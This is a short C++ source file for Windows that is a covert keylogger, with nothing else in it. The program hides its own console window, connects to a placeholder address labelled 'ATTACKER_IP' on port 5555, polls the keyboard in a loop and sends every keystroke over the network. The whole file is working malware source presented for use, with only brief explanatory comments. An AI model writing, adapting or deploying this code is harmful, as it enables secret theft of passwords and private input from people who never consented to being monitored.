#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main()
{
//Initializing the connection    
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hiding program window
    char KEY;
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;
    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("ATTACKER_IP"); //Attacker IP
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555); //Attacker's listening port
    connect(server, (SOCKADDR *)&addr, sizeof(addr));
    while (true)
    {
        Sleep(10);
        for (int KEY = 0x8; KEY < 0xFF; KEY++) //checks if this is a printable key
        {
            if (GetAsyncKeyState(KEY) == -32767) //if a key was pressed
            {
                char buffer[2]; // declare a variable that will hold the pressed key
                buffer[0] = KEY; //insert the key into the variable
                send(server, buffer, sizeof(buffer), 0); //send it over the network
            }
        }
    }
    closesocket(server);
    WSACleanup();
}